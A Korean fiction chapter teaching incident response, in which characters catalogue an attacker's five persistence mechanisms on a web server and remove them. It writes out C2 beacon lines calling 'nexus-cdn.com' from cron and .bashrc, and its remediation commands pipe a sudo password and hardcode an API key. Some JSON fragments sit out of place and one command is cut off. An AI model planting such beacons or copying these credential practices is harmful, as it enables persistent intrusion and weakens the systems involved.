# Chapter 4: 뿌리

---

수요일. 박지후가 web 서버의 **지속성 메커니즘**을 완전히 매핑했다.

"공격자가 심어놓은 뿌리를 전부 뽑아야 해." 지후가 화이트보드에 적었다.

```
[web 서버 — 발견된 지속성 메커니즘]

1. SSH 키 주입 (T1098.004)
   ~/.ssh/authorized_keys에 공격자 공개키 추가
   → 비밀번호 변경해도 키로 접속 가능

2. Cron 비콘 (T1053.003)
   web 사용자 crontab: */15 * * * * curl nexus-cdn.com/check
   시스템 crontab: */30 * * * * /tmp/.health_check.sh
   → 15분/30분마다 C2 체크인 + 명령 실행

3. 계정 생성 (T1136.001)
   guest03 사용자 — 비활성화됨 (우리가 잠금)
   → 하지만 /etc/passwd에 흔적 존재

4. PATH 하이잭 (T1574.007)
   /tmp/ls 파일 존재 — PATH에 /tmp가 포함되면 실행됨
   → 관리자가 ls를 실행하면 악성 스크립트가 대신 실행

5. .bashrc 수정 (T1546.004)
   web 사용자의 .bashrc에 한 줄 추가:
   curl -s http://nexus-cdn.com/alive?id=nx01 > /dev/null 2>&1 &
   → 로그인할 때마다 C2에 체크인
```

"**5개의 독립적인 지속성.**" 지후가 말했다. "하나를 지워도 나머지 4개가 살아 있어."

"전부 한 번에 제거해야 해." 김영훈이 말했다. "하나라도 남기면 공격자가 **재침투**할 수 있어."

      {"order":3,"title":"PATH 하이잭 제거","instruction_prompt":"echo 1 | sudo -S rm -f /tmp/ls /tmp/.health_check.sh","risk_level":"medium","subagent_url":"http://10.20.30.80:8002"},

"5개 전부 제거 완료." 지후가 확인했다.

"마지막으로." 김영훈이 말했다. "**모든 서버의 비밀번호를 변경**한다. 더 이상 '1'은 안 돼."

```bash
# 4대 서버 비밀번호 일괄 변경
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \

      {"order":2,"title":"web 비밀번호","instruction_prompt":"echo 1 | sudo -S sh -c \"echo web:$(openssl rand -base64 16) | chpasswd\"","risk_level":"high","subagent_url":"http://10.20.30.80:8002"},
      {"order":3,"title":"opsclaw 비밀번호","instruction_prompt":"echo 1 | sudo -S sh -c \"echo opsclaw:$(openssl rand -base64 16) | chpasswd\"","risk_level":"high","subagent_url":"http://localhost:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }'
```

"그리고 **sudo NOPASSWD를 제거**한다."

```bash
curl -s -X POST "http://localhost:8000/projects/$PID/dispatch" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"command":"echo 1 | sudo -S sed -i \"s/NOPASSWD: ALL/ALL/g\" /etc/sudoers","subagent_url":"http://10.20.30.80:8002"}'
```

"NOPASSWD 제거 완료. 이제 sudo에 비밀번호가 필요해."

---

가람이 지후에게 물었다. "선배, 이렇게 뿌리를 다 뽑으면 공격자는 더 이상 들어올 수 없는 건가요?"

지후가 쓴웃음을 지었다.

"**아마도.** 하지만 확신은 못 해. 우리가 **발견하지 못한** 지속성이 있을 수도 있어. 커널 레벨 백도어, 펌웨어 수정, BIOS 감염... 완전한 확신을 가지려면 **서버를 포맷하고 새로 설치**하는 게 맞아."

"포맷이요?" 도윤이 놀랐다.

"인시던트 대응의 정석은 **'의심스러우면 다시 만든다'**야." 김영훈이 말했다. "하지만 Nexus-1 서비스가 동작 중인 서버를 포맷하면... 서문기 상무가 날 죽일 거야."

관제실에 쓴웃음이 퍼졌다.

---

가람은 수첩에 적었다.

> `5중 지속성: SSH키 + cron + 시스템cron + PATH하이잭 + .bashrc`
> `"하나를 지워도 나머지 4개가 살아 있다" — 지후 선배`
> `뿌리를 다 뽑아도 확신은 못 한다. 발견 못 한 게 있을 수도.`
> `정석은 "포맷하고 새로 설치" — 하지만 현실은 "서비스가 돌아야 한다"`
> `보안과 가용성의 영원한 트레이드오프.`
